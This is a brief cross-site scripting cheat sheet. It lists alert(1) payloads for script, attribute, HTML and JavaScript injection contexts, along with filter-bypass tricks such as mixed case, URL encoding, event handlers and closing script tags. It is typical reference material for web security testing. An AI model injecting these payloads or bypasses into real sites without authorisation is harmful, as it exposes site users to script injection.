# XSS Payloads and Evasion Techniques

## Basic Payload

<script>alert(1)</script>

---

## Attribute Context

" onmouseover="alert(1)

---

## HTML Context

<img src=x onerror=alert(1)>

---

## JavaScript Context

'; alert(1); //

---

## Filter Bypass Techniques

### Case Manipulation
<ScRiPt>alert(1)</ScRiPt>

### Encoding
%3Cscript%3Ealert(1)%3C/script%3E

### Event Handlers
<img src=x onerror=alert(1)>

### Breaking Context
</script><script>alert(1)</script>

---

## Key Takeaway

Payloads must be adapted depending on the injection context and filtering mechanisms.
